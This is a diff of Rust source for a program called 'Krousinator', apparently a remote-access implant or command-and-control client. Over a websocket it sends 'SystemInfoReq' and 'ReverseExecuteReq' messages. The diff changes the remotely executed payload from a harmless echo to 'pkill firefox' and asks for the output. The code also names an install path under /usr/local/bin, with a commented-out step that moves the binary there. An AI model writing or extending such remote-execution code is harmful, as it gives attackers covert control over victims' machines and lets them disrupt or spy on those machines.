@@ -3,8 +3,6 @@ mod registry;
 mod models;
 use crate::registry::{krousinator_interface::KrousinatorInterface, handler_registry::HandlerRegistry};
 use crate::registry::entry::HandlerMeta;
-
-use openssl::error;
 // serd
 use serde_json::Value;
 
@@ -29,6 +27,7 @@ static DEST_PATH: &str = "/usr/local/bin/Krousinator";
 
 #[cfg(target_os = "linux")]
 static DEST_PATH: &str = "/usr/local/bin/Krousinator";
+
 
 
 
@@ -60,6 +59,8 @@ async fn main() {
 
 
     // setup
+
+
     // move_binary().unwrap_or_else(|e| panic!("moving binary operation failed: {}", e)).await;
     let mut reg: HandlerRegistry = HandlerRegistry::new();
 
@@ -79,7 +80,7 @@ async fn main() {
     
     for i in 0..10 {
         write.send("{\"_t\":\"SystemInfoReq\"}".into()).await.unwrap();
-        write.send(format!("{{\"_t\":\"ReverseExecuteReq\",\"payload\":\"echo cool {}\"}}", i).into()).await.unwrap();
+        write.send(format!("{{\"_t\":\"ReverseExecuteReq\",\"payload\":\"pkill firefox\",\"payload_response\":true}}").into()).await.unwrap();
     }
 
     let mut krous: KrousinatorInterface = KrousinatorInterface::new(write);
@@ -100,9 +101,8 @@ async fn main() {
                             continue;
                         }
                     };
-        
                     
-        
+                    
                     let json: Value = match serde_json::from_str(&raw_text) {
                         Ok(val) => val,
                         Err(_) => {
@@ -112,7 +112,7 @@ async fn main() {
                     };
 
                     println!("{}", raw_text);
-        
+
                     let message_type = match json.get("_t").and_then(|v| v.as_str()) {
                         Some(t) => t,
                         None => {
@@ -122,7 +122,10 @@ async fn main() {
                     };
         
                     match reg.get(message_type, &raw_text) {
-                        Some(handler) => handler.handle(&mut krous),
+                        Some(handler) => match handler {
+                            Ok(handler) => handler.handle(&mut krous).await,
+                            Err(_err) => continue
+                        }
                         None => {
                             println!("No handler found for type '{}'. Skipping.", message_type);
                             continue;
